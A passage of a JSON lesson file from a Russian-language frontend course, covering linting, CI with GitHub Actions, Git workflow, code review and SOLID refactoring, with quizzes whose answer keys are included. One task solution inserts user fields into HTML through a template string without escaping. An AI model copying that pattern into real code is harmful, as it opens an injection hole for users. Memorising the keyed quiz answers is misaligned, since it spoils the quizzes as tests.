          "content": "ESLint — статический анализатор JavaScript/TypeScript. Находит потенциальные ошибки, антипаттерны и нарушения стиля ДО запуска кода.\n\nОсновные категории правил:\n- Ошибки: `no-unused-vars` (неиспользуемые переменные), `no-undef` (необъявленные переменные)\n- Лучшие практики: `eqeqeq` (строгое сравнение ===), `no-var` (используйте let/const)\n- Стиль: делегируйте Prettier\n\nPrettier — форматтер кода. В отличие от ESLint, Prettier НЕ находит ошибки — он автоматически форматирует код по единому стилю:\n- Отступы, кавычки, точки с запятой, длина строки\n- Поддерживает: JS, TS, JSX, CSS, HTML, JSON, Markdown\n- Интеграция с VS Code: Format On Save\n\nПринцип: ESLint ищет ошибки, Prettier форматирует стиль.\n\nCI/CD (Continuous Integration / Continuous Deployment):\nCI/CD-пайплайн — автоматизированная цепочка проверок, запускаемая при каждом push или PR:\n\n1. Install — установка зависимостей (npm ci — детерминированная установка из lock-файла)\n2. Lint — ESLint проверяет код на ошибки и антипаттерны\n3. Type Check — tsc --noEmit проверяет TypeScript-типы\n4. Test — запуск unit-тестов (Vitest, Jest)\n5. Build — продакшен-сборка (vite build)\n6. Deploy — автоматический деплой на staging/production (Vercel, Netlify)\n\nЕсли ЛЮБОЙ шаг падает — PR не может быть смержен. Это защищает main от сломанного кода.\n\nGitHub Actions — CI/CD-сервис GitHub:\n`.github/workflows/ci.yml` — YAML-конфиг пайплайна\nЗапускается при push, pull_request или по расписанию (cron)",
          "codeExample": {
            "language": "bash",
            "code": "# .github/workflows/ci.yml\nname: CI Pipeline\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: 'npm'\n\n      - run: npm ci          # Установка\n      - run: npm run lint     # ESLint\n      - run: npx tsc --noEmit # TypeScript\n      - run: npm run build    # Сборка",
            "title": "GitHub Actions CI/CD пайплайн",
            "explanation": "CI запускается на каждый push и PR. npm ci — детерминированная установка (без обновления lock-файла). Последовательно: lint → type check → build. Если хоть один шаг падает — PR блокируется."
          }
        },
        {
          "title": "Рекомендуемые видеоматериалы: Git, GitHub и Git Flow",
          "content": "Для наглядного освоения системы контроля версий Git, базовых команд, веток, разрешения конфликтов, методологии Git Flow и командной работы на GitHub рекомендуем видеоматериалы:\n\n- **[Лучший Гайд по Git Для Начинающих За 15 Минут (YouTube)](https://youtu.be/XuFaQSW79rM?si=_8sCVKAYLWPDe6l4)** — емкий и понятный видеогайд от Vlad Mishustin: базовые команды (init, add, commit, push, pull), работа с ветками (branch, checkout, merge), разрешение конфликтов и работа с GitHub.\n- **[Git и GitHub Курс Для Новичков (YouTube)](https://youtu.be/zZBiln_2FhM?si=SLjs11lPhw0043bJ)** — подробный практический видеокурс от Владилена Минина: архитектура Git, коммиты, ветвление, слияние веток, разрешение конфликтов, работа с удаленным репозиторием GitHub, ssh-ключи и профессиональный workflow.\n- **[Что такое Git flow и когда использовать? (YouTube)](https://youtu.be/umiT0yIsSrc?si=M_zhAKTF7lWv9XDn)** — детальный разбор методологии ветвления Git Flow от Антона Ларичева (PurpleSchool): структура веток (main, develop, feature, release, hotfix), сценарии применения, релизные циклы и сравнение с Trunk-Based Development."
        }
      ],
      "seniorTips": [
        "git add -p (patch mode) — золотой стандарт: позволяет коммитить изменения по хункам, создавая атомарные коммиты. Один коммит = одно логическое изменение.",
        "Никогда не делайте force push (git push -f) в main. Это перезаписывает историю и ломает работу всей команды.",
        "npm ci вместо npm install в CI/CD — детерминированная установка строго по lock-файлу, без обновления зависимостей.",
        "Husky + lint-staged — автоматический запуск ESLint и Prettier при каждом git commit (pre-commit hook). Предотвращает попадание невалидного кода в репозиторий."
      ],
      "commonMistakes": [
        {
          "bad": "git add .\ngit commit -m \"fix\"",
          "good": "git add -p\ngit commit -m \"fix(cart): prevent\n  negative quantity on decrement\"",
          "reason": "Коммит 'fix' без scope и описания бесполезен в истории. git add . коммитит ВСЁ, включая отладочные console.log. Используйте git add -p и Conventional Commits."
        },
        {
          "bad": "git push -f origin main",
          "good": "git push origin feature/my-task",
          "reason": "Force push в main перезаписывает историю и ломает работу ВСЕЙ команды. Force push допустим ТОЛЬКО в вашей личной feature-ветке для cleanup перед PR."
        },
        {
          "bad": "// Зависимости в dependencies\n\"devDependencies\": {\n  \"react\": \"^19.1.0\"\n}",
          "good": "\"dependencies\": {\n  \"react\": \"^19.1.0\"\n},\n\"devDependencies\": {\n  \"vite\": \"^6.0.0\"\n}",
          "reason": "react нужен в runtime — он должен быть в dependencies. devDependencies не попадают в бандл при npm install --production. Путаница приводит к 'Module not found' в продакшене."
        }
      ],
      "keyTakeaways": [
        "Feature-Branch Workflow: каждая задача в отдельной ветке → Push → Pull Request → Code Review → Merge в main.",
        "Conventional Commits (`feat:`, `fix:`, `refactor:`, `docs:`, `chore:`) стандартизируют историю и позволяют автоматически генерировать CHANGELOG.",
        "Vite обеспечивает мгновенный HMR в dev-режиме и оптимизированную сборку через Rollup в продакшене.",
        "`dependencies` — runtime (react, zustand), `devDependencies` — инструменты (vite, eslint, prettier). Путаница ведёт к ошибкам в продакшене.",
        "CI/CD пайплайн (lint → type check → test → build → deploy) защищает main от сломанного кода. Если шаг падает — PR блокируется.",
        "`git add -p` для атомарных коммитов. Никогда не используйте `git push -f` в main."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"terminal\"></div>",
      "initialCss": "#terminal { background: #0a0e13; color: #2dff8a; font-family: 'JetBrains Mono', monospace; padding: 20px; min-height: 300px; border-radius: 8px; white-space: pre-wrap; }",
      "initialJs": "const term = document.getElementById('terminal');\nconst log = (msg) => term.textContent += '$ ' + msg + '\\n';\n\n// Симулируйте Git-воркфлоу\nlog('git checkout main');\nlog('git pull origin main');\n// Добавьте команды для создания ветки, коммитов и PR",
      "instructions": "Симулируйте полный Feature-Branch Workflow в терминале:\n1. Переключитесь на main и обновите\n2. Создайте ветку feature/todo-list\n3. Сделайте 3 коммита с Conventional Commits: feat, fix, style\n4. Push ветку\n5. Симулируйте merge в main\n6. Удалите ветку"
    },
    "task": {
      "title": "Настройка CI/CD для Vite-проекта",
      "scenario": "Вам поручили настроить CI/CD пайплайн для нового Vite + React + TypeScript проекта. Пайплайн должен автоматически проверять код при каждом PR.",
      "criteria": [
        "GitHub Actions workflow: .github/workflows/ci.yml",
        "Триггеры: push в main и pull_request в main",
        "Шаги: checkout, setup-node (v22), npm ci, lint, type check (tsc --noEmit), build",
        "package.json содержит скрипты: dev, build, lint, format",
        "ESLint конфиг с правилами: no-unused-vars, eqeqeq, no-var",
        "Prettier конфиг: singleQuote: true, semi: true, tabWidth: 2"
      ],
      "starterCode": {
        "html": "<!-- Создайте .github/workflows/ci.yml -->",
        "js": "// Создайте package.json с правильными скриптами"
      },
      "hints": [
        "Используйте actions/checkout@v4 и actions/setup-node@v4",
        "npm ci вместо npm install для детерминированной установки",
        "tsc --noEmit — проверка типов без генерации файлов",
        "Добавьте cache: 'npm' в setup-node для ускорения CI"
      ],
      "solution": {
        "html": "name: CI\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: 'npm'\n      - run: npm ci\n      - run: npm run lint\n      - run: npx tsc --noEmit\n      - run: npm run build",
        "explanation": "CI запускается на push и PR в main. npm ci — из lock-файла. Линтинг → Type Check → Build — любой падающий шаг блокирует мерж."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro2-q1",
          "question": "В одном файле вы правили две несвязанные вещи и хотите развести их по разным коммитам. Что поможет?",
          "options": [
            "`git add .` — сложить всё в один коммит, разделить его будет проще потом",
            "`git stash` — отложить все изменения и переписать файл заново по частям",
            "`git commit -a` — команда сама сгруппирует изменения по смыслу файлов",
            "`git add -p` — добавление изменений по фрагментам, с выбором каждого куска"
          ],
          "correctIndex": 3,
          "explanation": "Режим по фрагментам показывает каждый кусок изменений по очереди и спрашивает, включать ли его в коммит, — куски при необходимости дробятся ещё мельче. Так получаются атомарные коммиты: один коммит — одно логическое изменение. Это окупается при поиске причины ошибки перебором истории и при откате конкретной правки без задевания соседних."
        },
        {
          "id": "pro2-q2",
          "question": "Что означают эти маркеры в файле и что делать дальше?",
          "codeSnippet": "<<<<<<< HEAD\nconst TIMEOUT = 5000;\n=======\nconst TIMEOUT = 3000;\n>>>>>>> feature/api",
          "options": [
            "Сверху версия из вливаемой ветки, снизу ваша текущая; нижнюю нужно удалить",
            "Сверху ваша текущая версия, снизу вливаемая; выбрать нужное и убрать маркеры",
            "Файл повреждён при слиянии, его следует восстановить из последнего коммита",
            "Git уже выбрал верный вариант, а маркеры удалятся сами при создании коммита"
          ],
          "correctIndex": 1,
          "explanation": "Между первым маркером и разделителем находится состояние текущей ветки, между разделителем и последним маркером — то, что приходит из вливаемой. Git не может решить, какое значение верное, и оставляет выбор человеку. Разрешение конфликта — это осмысленная правка: оставить одну версию, взять обе или написать третью, затем удалить все три служебные строки и добавить файл в индекс."
        },
        {
          "id": "pro2-q3",
          "question": "Почему на сервере сборки используют `npm ci`, а не `npm install`?",
          "options": [
            "Команда ставит только те пакеты, которые нужны в рабочем окружении приложения",
            "Установка идёт строго по lock-файлу и не меняет его, давая воспроизводимую сборку",
            "Команда кеширует пакеты между запусками, а обычная установка кеш игнорирует",
            "Команда умеет работать без файла описания пакета, что удобно в конвейере"
          ],
          "correctIndex": 1,
          "explanation": "Обычная установка вправе обновить зависимости в рамках допустимых диапазонов и переписать lock-файл, из-за чего сборка на сервере может отличаться от локальной. Команда для конвейера удаляет папку зависимостей, ставит ровно те версии, что записаны в lock-файле, и падает с ошибкой, если файл рассинхронизирован с описанием пакета. Отсюда предсказуемость и заметный выигрыш в скорости."
        },
        {
          "id": "pro2-q4",
          "question": "Куда в описании пакета поместить библиотеку работы с датами, которую импортирует компонент интерфейса?",
          "options": [
            "В `devDependencies` — она нужна только на этапе сборки готового бандла",
            "В `peerDependencies` — пусть версию выберет приложение-потребитель библиотеки",
            "В `dependencies` — её код попадает в собранное приложение и нужен во время работы",
            "В `optionalDependencies` — сборка не должна падать, если пакета не окажется"
          ],
          "correctIndex": 2,
          "explanation": "Правило простое: всё, что импортирует код приложения, относится к обычным зависимостям, а инструменты разработки — сборщик, линтер, средства тестирования — к зависимостям разработчика. Ошибка вылезает при установке без зависимостей разработчика или в образе контейнера: сборка падает с сообщением о ненайденном модуле. Отдельные категории нужны библиотекам и редким необязательным пакетам."
        },
        {
          "id": "pro2-q5",
          "question": "Шаг проверки типов в конвейере завершился с ошибкой. Что произойдёт дальше при правильной настройке?",
          "options": [
            "Остальные шаги всё равно выполнятся, а результат проверки попадёт в отчёт для сведения",
            "Конвейер остановится, и слияние запроса будет заблокировано до исправления",
            "Запрос будет автоматически отклонён, а ветка удалена из репозитория",
            "Конвейер перезапустится с начала и повторит попытку ещё два раза"
          ],
          "correctIndex": 1,
          "explanation": "Смысл конвейера в том, чтобы сломанный код физически не мог попасть в основную ветку. Ненулевой код возврата останавливает выполнение, статус проверки становится красным, и настроенная защита ветки не даёт слить запрос. Автор чинит проблему, отправляет новый коммит, и проверки запускаются заново. Автоматический перезапуск маскировал бы плавающие ошибки, а удаление ветки уничтожило бы работу."
        }
      ]
    }
  },
  {
    "id": "pro-3",
    "moduleId": "pro",
    "level": 3,
    "title": "Культура Code Review, принципы чистого кода (SOLID) и рефакторинг",
    "subtitle": "Культура Code Review, принципы SOLID во фронтенде, DRY, KISS, YAGNI, Code Smells и техники рефакторинга",
    "description": "Освойте инженерную культуру и стандарты качества кода: проведение конструктивного Code Review без токсичности, применение принципов SOLID, DRY, KISS и YAGNI во фронтенд-архитектуре, распознавание «запахов кода» (Code Smells) и безопасный рефакторинг без поломки бизнес-логики.",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "code-review",
      "clean-code",
      "solid",
      "dry",
      "kiss",
      "yagni",
      "refactoring",
      "code-smells",
      "engineering-culture"
    ],
    "theory": {
      "overview": "Написание работающего кода — это лишь половина работы инженера. Вторая половина — сделать так, чтобы этот код было легко читать, безопасно модифицировать и поддерживать команде спустя полгода.\n\nВ этом уроке мы разберём культуру **Code Review** (как рецензировать чужой код и принимать критику без стресса), адаптируем фундаментальные принципы **SOLID / DRY / KISS / YAGNI** под специфику современного фронтенда и научимся находить опасные «запахи кода» (Code Smells).",
      "sections": [
        {
          "title": "Культура и процесс Code Review в продуктовой команде",
          "content": "Code Review — это инструмент коллективного владения кодом и обмена знаниями, а не экзамен:\n\n1. **Правила для Автора Pull Request (PR)**:\n- **Размер имеет значение**: PR должен быть компактным (до 300–400 строк кода). Огромные PR на 2000 строк никто внимательно не читает!\n- **Понятное описание**: скриншоты «До/После», ссылка на задачу в Jira/Trello, перечень ключевых изменений.\n- **Self-Review**: перед отправкой команде просмотрите свой diff самостоятельно — вы найдете 80% забытых console.log и лишних пробелов.\n\n2. **Правила для Рецензента (Reviewer)**:\n- **Критикуйте код, а не автора**: вместо «Ты написал ужасный цикл» пишите «Кажется, этот цикл можно упростить через reduce, чтобы избежать мутаций».\n- **Разделяйте важное и вкусовщину**: используйте префиксы `[nitpick]` (мелкая придирка по стилю, не блокирующая мерж), `[question]` (вопрос для понимания), `[blocker]` (критический баг/уязвимость).\n- **Хвалите за хорошие решения**: если коллега написал элегантный хук — напишите «Отличное решение!»",
          "codeExample": {
            "language": "typescript",
            "code": "// Пример конструктивного комментария на Code Review:\n/*\n💬 [Suggestion / Performance]:\nПривет! Компонент перерисовывается при каждом движении мыши, \nпотому что обработчик создается заново внутри тела функции. \nДавай обернем его в useCallback или вынесем логику в кастомный хук useMousePosition?\nЭто сэкономит перерисовки на слабых устройствах.\n*/\n\n// Было (автор PR):\nconst onMove = (e) => setPos({ x: e.clientX, y: e.clientY });\n\n// Стало (после ревью):\nconst onMove = useCallback((e: MouseEvent) => {\n  setPos({ x: e.clientX, y: e.clientY });\n}, []);",
            "title": "Конструктивная обратная связь на Code Review с объяснением причин",
            "explanation": "Хороший комментарий на Code Review объясняет ПОЧЕМУ предлагается изменение и КАКОЙ профит для проекта это даст."
          },
          "image": {
            "src": "/images/lessons/web-code-review-solid.svg",
            "alt": "Культура Code Review и Принципы SOLID во фронтенде",
            "caption": "Культура эффективного Code Review (префиксы, размер PR) и принципы SOLID во фронтенде"
          }
        },
        {
          "title": "Принципы SOLID в контексте фронтенда и React",
          "content": "Адаптация 5 принципов объектно-ориентированного дизайна под фронтенд:\n\n1. **S — Single Responsibility (Единственная ответственность)**:\n- Компонент должен решать ОДНУ задачу. Не смешивайте в одном файле верстку, отправку сетевых запросов, валидацию форм и анимации. Выносите запросы в API-слой, состояние — в кастомные хуки, а компонент оставляйте чистым Presentational-слоем.\n\n2. **O — Open/Closed (Открытость для расширения, закрытость для модификации)**:\n- Компонент должен расширяться новыми возможностями через props, children или слоты без переписывания его исходного кода.\n\n3. **L — Liskov Substitution (Подстановка Барбары Лисков)**:\n- Любой кастомный компонент `<Button variant=\"primary\" />` должен принимать все стандартные HTML-атрибуты нативной кнопки (`onClick`, `disabled`, `type`, `aria-label`) без сюрпризов.\n\n4. **I — Interface Segregation (Разделение интерфейсов)**:\n- Не передавайте в компонент огромный объект `user: User` (на 50 полей), если компоненту `UserAvatar` нужны только `avatarUrl` и `username`.\n\n5. **D — Dependency Inversion (Инверсия зависимостей)**:\n- Высокоуровневые модули не должны зависеть от низкоуровневых. Передавайте функции отправки данных через пропсы или используйте Dependency Injection через React Context.",
          "codeExample": {
            "language": "typescript",
            "code": "// ❌ Нарушение Interface Segregation и Single Responsibility:\n// Компонент принимает 50 полей и сам ходит в сеть\nexport const BadUserProfile = ({ user }: { user: BigUserObject }) => {\n  const handleDelete = () => fetch('/api/user', { method: 'DELETE' });\n  return <div><img src={user.avatar} /><button onClick={handleDelete}>Удалить</button></div>;\n};\n\n// ✅ Соблюдение SOLID:\n// 1. Узкий интерфейс пропсов (только то, что нужно)\ninterface UserAvatarProps {\n  avatarUrl: string;\n  name: string;\n  onDelete?: () => void; // Инверсия: логика передается снаружи\n}\n\nexport const UserAvatar = ({ avatarUrl, name, onDelete }: UserAvatarProps) => (\n  <div className=\"user-avatar-card\">\n    <img src={avatarUrl} alt={name} />\n    {onDelete && <button onClick={onDelete}>Удалить</button>}\n  </div>\n);",
            "title": "Применение принципов SOLID: разделение интерфейсов и инверсия зависимостей",
            "explanation": "Компонент UserAvatar стал максимально переиспользуемым, легким для тестирования и не привязан к конкретному API-эндпоинту."
          }
        },
        {
          "title": "Принципы DRY, KISS, YAGNI и когнитивная нагрузка (Cognitive Load)",
          "content": "Практические ориентиры для повседневной разработки:\n\n1. **KISS (Keep It Simple, Stupid — Делай проще!)**:\n- Простой понятный код всегда лучше сложной трехэтажной абстракции с дженериками на 5 уровней вложенности.\n\n2. **YAGNI (You Aren't Gonna Need It — Вам это не понадобится!)**:\n- Не пишите код «на будущее», если он не нужен в текущей задаче. 80% таких «заделов на будущее» никогда не используются, но годами усложняют чтение кодовой базы.\n\n3. **DRY (Don't Repeat Yourself) — без фанатизма (WET vs DRY)**:\n- Дублирование лучше, чем неправильная абстракция (AHA — Avoid Hasty Abstractions). Если код похож в двух местах, но развивается независимо — оставьте их раздельными.\n\n4. **Cognitive Load (Когнитивная нагрузка)**:\n- Хороший код читается сверху вниз как книга, без необходимости держать в голове 10 переменных и прыгать по 15 файлам.",
          "codeExample": {
            "language": "typescript",
            "code": "// ❌ Нарушение KISS и YAGNI (Оверинжиниринг):\nclass UserFactoryAbstractSingletonProxyFactoryBuilder {\n  // 50 строк сложнейшего кода ради форматирования строки имени!\n}\n\n// ✅ KISS: Простая чистая функция\nexport function formatFullName(firstName: string, lastName: string): string {\n  return `${firstName.trim()} ${lastName.trim()}`;\n}",
            "title": "Принцип KISS: простая функция против необоснованного оверинжиниринга",
            "explanation": "Простые функции легче тестировать, они не создают оверхеда и понятны любому джуниору."
          }
        },
        {
          "title": "Запахи кода (Code Smells) и техники безопасного рефакторинга",
          "content": "Признаки проблемного кода и способы их устранения:\n\n1. **Long Method / Large Component (Компоненты-боги на 1000 строк)**:\n- *Лечение*: декомпозиция на мелкие подкомпоненты и кастомные хуки.\n\n2. **Deep Nesting (Глубокая вложенность if/else)**:\n- *Лечение*: применение Guard Clauses (ранний выход из функции `if (!user) return null;`).\n\n3. **Magic Numbers / Strings (Магические числа и строки)**:\n- *Лечение*: вынос в именованные константы или TypeScript Enums.\n\n4. **Prop Drilling (Прокидывание пропсов сквозь 7 уровней)**:\n- *Лечение*: React Context, Zustand или композиция через `children`.",
          "codeExample": {
            "language": "typescript",
            "code": "// ❌ До рефакторинга: спагетти с вложенными if/else (Deep Nesting)\nfunction calculateBonus(user: User) {\n  if (user) {\n    if (user.isActive) {\n      if (user.yearsOfExperience > 5) {\n        return user.salary * 0.2;\n      } else {\n        return user.salary * 0.1;\n      }\n    } else {\n      return 0;\n    }\n  } else {\n    return 0;\n  }\n}\n\n// ✅ После рефакторинга: Guard Clauses (Ранний выход) и чистая логика\nfunction calculateBonusClean(user?: User): number {\n  if (!user || !user.isActive) return 0;\n  \n  const bonusRate = user.yearsOfExperience > 5 ? 0.2 : 0.1;\n  return user.salary * bonusRate;\n}",
            "title": "Техника рефакторинга: устранение глубокой вложенности через Guard Clauses",
            "explanation": "Код с ранними выходами (Guard Clauses) имеет цикломатическую сложность 1 и читается мгновенно."
          }
        },
        {
          "title": "Рекомендуемые видеоуроки по принципам SOLID и чистому коду",
          "content": "Для глубокого и наглядного понимания принципов проектирования гибкого и расширяемого кода рекомендуем изучить видеоматериал:\n\n- **[SOLID принципы разработки программного обеспечения простыми словами (YouTube)](https://youtu.be/TxZwqVTaCmA?si=r3G1_2tTERpVPYbn)** — подробный и понятный видеоразбор каждого из пяти принципов SOLID (Single Responsibility, Open-Closed, Liskov Substitution, Interface Segregation, Dependency Inversion) с разбором архитектурных решений и типичных ошибок проектирования."
        }
      ],
      "seniorTips": [
        "При проведении Code Review всегда объясняйте причину замечания и предлагайте альтернативное решение — это развивает команду и ускоряет мерж.",
        "Используйте технику Guard Clauses (ранние return) для устранения пирамид if/else в компонентах и хелперах.",
        "Следуйте принципу YAGNI: никогда не проектируйте фичи «на будущее», если они не требуются в текущем спринте.",
        "Перед отправкой Pull Request всегда проводите Self-Review своего диффа — это признак высокой инженерной культуры."
      ],
      "commonMistakes": [
        {
          "bad": "// Огромные PR на 3000 строк кода с 5 разными фичами\n// Ревьюверы ставят аппрув не глядя из-за усталости, баги летят в прод",
          "good": "// Маленькие атомарные PR (1 задача = 1 PR на 150-300 строк)",
          "reason": "Маленькие PR рецензируются за 10 минут, находят на 80% больше ошибок и легко откатываются при проблемах."
        },
        {
          "bad": "// Токсичные комментарии на ревью: «Кто это написал? Переделай всё!»",
          "good": "// Конструктив: «[suggestion] Кажется, здесь можно использовать useMemo, чтобы избежать повторных вычислений»",
          "reason": "Токсичность убивает мотивацию и доверие в команде. Code Review — это инструмент взаимного обучения."
        },
        {
          "bad": "// Нарушение Interface Segregation: прокидывание целого объекта в кнопку\n<DeleteButton user={bigUserObjectWith50Fields} />",
          "good": "<DeleteButton userId={user.id} onDelete={handleDelete} />",
          "reason": "Кнопке нужен только id и хендлер. Передача всего объекта создает ненужную связность."
        }
      ],
      "keyTakeaways": [
        "Code Review — инструмент обучения и коллективной ответственности за качество продукта.",
        "SOLID во фронтенде: разделяйте логику и верстку, передавайте узкие пропсы и инвертируйте зависимости.",
        "KISS и YAGNI защищают кодовую базу от разрушительного оверинжиниринга.",
        "Guard Clauses снижают цикломатическую сложность функций до минимума.",
        "Декомпозируйте большие компоненты на маленькие сфокусированные модули."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"cr-app\">\n  <h3>Code Review & Refactoring Тренажер</h3>\n  <button id=\"btn-refactor\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">Применить Guard Clauses (Рефакторинг)</button>\n  <pre id=\"code-view\" style=\"margin-top:12px; color:#e6edf3; font-size:12px; line-height:1.5; background:#161b22; padding:12px; border-radius:6px;\"></pre>\n</div>",
      "initialCss": "#cr-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const codeView = document.getElementById('code-view');\nlet isRefactored = false;\n\nconst badCode = `// ❌ До рефакторинга: 4 уровня вложенности\nfunction processOrder(order) {\n  if (order) {\n    if (order.isPaid) {\n      if (order.items.length > 0) {\n        return sendToDelivery(order);\n      } else { throw new Error('Корзина пуста'); }\n    } else { throw new Error('Заказ не оплачен'); }\n  } else { throw new Error('Заказ не найден'); }\n}`;\n\nconst goodCode = `// ✅ После рефакторинга: Guard Clauses (Чистый код)\nfunction processOrder(order) {\n  if (!order) throw new Error('Заказ не найден');\n  if (!order.isPaid) throw new Error('Заказ не оплачен');\n  if (order.items.length === 0) throw new Error('Корзина пуста');\n  \n  return sendToDelivery(order);\n}`;\n\ncodeView.textContent = badCode;\n\ndocument.getElementById('btn-refactor').onclick = () => {\n  isRefactored = !isRefactored;\n  codeView.textContent = isRefactored ? goodCode : badCode;\n  document.getElementById('btn-refactor').textContent = isRefactored ? 'Показать старый спагетти-код' : 'Применить Guard Clauses (Рефакторинг)';\n};",
      "instructions": "Практика с рефакторингом:\n1. Нажмите кнопку для просмотра преобразования вложенных if/else в плоские Guard Clauses\n2. Обратите внимание на читаемость и легкость тестирования"
    },
    "task": {
      "title": "Рефакторинг компонента с нарушением SOLID и устранение Code Smells",
      "scenario": "Вам передан компонент UserCard, содержащий 5 запахов кода: смешивание API-запросов с версткой, прямое обращение к localStorage внутри рендера, глубокая вложенность условий и передача избыточного объекта. Проведите рефакторинг, разделив ответственность.",
      "criteria": [
        "Применен принцип Single Responsibility: логика и сайд-эффекты отделены от верстки",
        "Устранена глубокая вложенность с помощью Guard Clauses",
        "Интерфейс пропсов сужен в соответствии с Interface Segregation",
        "Использованы понятные константы вместо магических значений"
      ],
      "starterCode": {
        "js": "// Проведите рефакторинг спагетти-функции\nfunction renderUserProfile(data) {\n  // Ваш чистый код\n}"
      },
      "hints": [
        "Используйте ранний выход: if (!data || !data.user) return null;",
        "Вынесите форматирование в чистую функцию formatUserData",
        "Принимайте только { name, avatarUrl, role }"
      ],
      "solution": {
        "js": "interface UserProfileProps {\n  name: string;\n  avatarUrl: string;\n  role: string;\n  onEdit?: () => void;\n}\n\n// 1. Чистый Presentational-компонент (Single Responsibility)\nexport function UserProfileCard({ name, avatarUrl, role, onEdit }: UserProfileProps) {\n  if (!name) return null; // Guard clause\n\n  return {\n    html: `\n      <div class=\"user-profile-card\">\n        <img src=\"${avatarUrl || '/default-avatar.png'}\" alt=\"${name}\" />\n        <h3>${name}</h3>\n        <span class=\"badge\">${role}</span>\n      </div>\n    `\n  };\n}\n\n// 2. Чистая функция форматирования\nexport function formatRole(roleCode: string): string {\n  const ROLES: Record<string, string> = {\n    admin: 'Администратор',\n    intern: 'Стажёр',\n    lead: 'Тимлид'\n  };\n  return ROLES[roleCode] || 'Пользователь';\n}",
        "explanation": "Компонент разделен на чистую функцию верстки и утилиту форматирования, устранены сайд-эффекты и применены Guard Clauses."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro3-q1",
          "question": "Компонент делает запрос к API, валидирует форму, хранит состояние и рисует разметку. Как разделить его по принципу единственной ответственности?",
          "options": [
            "Вынести запрос и валидацию в отдельные хуки и сервисы, оставив компоненту отрисовку",
            "Разбить файл на несколько по сто строк, сохранив всю логику внутри каждого",
            "Перенести всю логику в глобальное хранилище, а компонент подключить к нему",
            "Обернуть компонент в компонент высшего порядка, не меняя его содержимого"
          ],
          "correctIndex": 0,
          "explanation": "Ответственность делится по смыслу, а не по числу строк. Работа с сетью уходит в слой сервисов, правила валидации — в отдельный модуль, связывание состояния с интерфейсом — в собственный хук, а компоненту остаётся описывать, как это выглядит. Каждую часть теперь можно тестировать и переиспользовать отдельно. Перенос всего подряд в глобальное хранилище лишь меняет место свалки."
        },
        {
          "id": "pro3-q2",
          "question": "Кнопке удаления передают весь объект пользователя, хотя ей нужен только идентификатор. Какой принцип нарушен?",
          "options": [
            "Подстановки Лисков: производный тип не может прозрачно заменить базовый",
            "Открытости и закрытости: компонент невозможно расширить, не изменяя его код",
            "Разделения интерфейсов: компонент вынужден зависеть от данных, которые ему не нужны",
            "Единственной ответственности: компонент решает сразу две разные задачи"
          ],
          "correctIndex": 2,
          "explanation": "Принцип разделения интерфейсов требует, чтобы потребитель зависел только от того, чем реально пользуется. Кнопка, принимающая весь объект, оказывается связана с его структурой: изменится форма данных — придётся править и кнопку, а для теста нужно собирать полноценный объект вместо одной строки. Узкий набор входных параметров делает компонент переиспользуемым и простым в проверке."
        },
        {
          "id": "pro3-q3",
          "question": "Что означает пометка «nitpick» в комментарии на ревью?",
          "options": [
            "Необязательное замечание по вкусу: автор вправе принять его или объяснить отказ",
            "Замечание блокирует слияние и требует обязательного исправления до мержа",
            "Обнаружена уязвимость, которую нужно устранить до конца рабочего дня",
            "Комментарий адресован не автору, а другому ревьюеру этой ветки"
          ],
          "correctIndex": 0,
          "explanation": "Пометка честно сообщает вес замечания: это предпочтение ревьюера, а не дефект. Без неё автор вынужден гадать, что блокирует слияние, а что нет, и обсуждение растягивается. В зрелых командах приняты несколько уровней: блокирующее замечание, вопрос на уточнение, предложение и вот такая мелочь по вкусу."
        },
        {
          "id": "pro3-q4",
          "question": "Разработчик заранее строит абстрактный слой «на случай смены базы данных», хотя в задаче этого нет. Какой принцип нарушен?",
          "options": [
            "DRY — повторяющийся код следовало вынести в общее место значительно раньше",
            "SOLID — абстракции обязаны напрямую зависеть от конкретных реализаций",
            "KISS — в рабочем коде вообще не должно быть слоёв абстракции",
            "YAGNI — функциональность создаётся без реальной текущей бизнес-потребности"
          ],
          "correctIndex": 3,
          "explanation": "Принцип прямо говорит: не пишите то, что не нужно прямо сейчас. Предсказание будущих требований почти всегда ошибается, а абстракция остаётся — её приходится поддерживать, тестировать и объяснять новым людям. Когда требование действительно появится, вы будете знать о задаче гораздо больше и спроектируете точнее. Принцип простоты советует выбирать решение попроще, а не отказываться от абстракций вовсе."
        },
        {
          "id": "pro3-q5",
          "question": "Запрос на слияние вырос до двух тысяч изменённых строк. Чем это плохо?",
          "options": [
            "Система контроля версий не умеет строить наглядные различия для больших изменений",
            "Такие запросы автоматически блокируются стандартными настройками репозитория",
            "Ревью становится поверхностным, ошибки пропускаются, а откат сильно усложняется",
            "Крупный запрос нельзя слить без предварительного перебазирования на свежую ветку"
          ],
          "correctIndex": 2,
          "explanation": "Внимание ревьюера кончается примерно через час: на большом объёме комментарии вырождаются в формальное одобрение, и настоящие дефекты уезжают в продакшен. Вдобавок такой запрос неделями висит в ожидании, накапливая конфликты, а при обнаружении проблемы откатывать приходится всё сразу. Ориентир — от ста пятидесяти до четырёхсот строк на одну законченную задачу."
        }
      ]
    }
  },
  {
    "id": "pro-4",
    "moduleId": "pro",
    "level": 4,
    "title": "Инструменты сборки и экосистема: Vite, Rollup, Webpack, npm, pnpm и Monorepo",
    "subtitle": "Эволюция бандлеров, Vite vs Webpack, Tree Shaking, Source Maps, pnpm hard links, SemVer и Monorepos",
    "description": "Освойте современный инструментарий фронтенд-инженера: эволюцию сборщиков (Webpack, Vite, Rollup, esbuild), оптимизацию бандла через Tree Shaking и Code Splitting, эффективную работу с пакетными менеджерами (pnpm, npm, yarn), семантическое версионирование SemVer и архитектуру монорепозиториев (Turborepo).",
    "estimatedMinutes": 65,
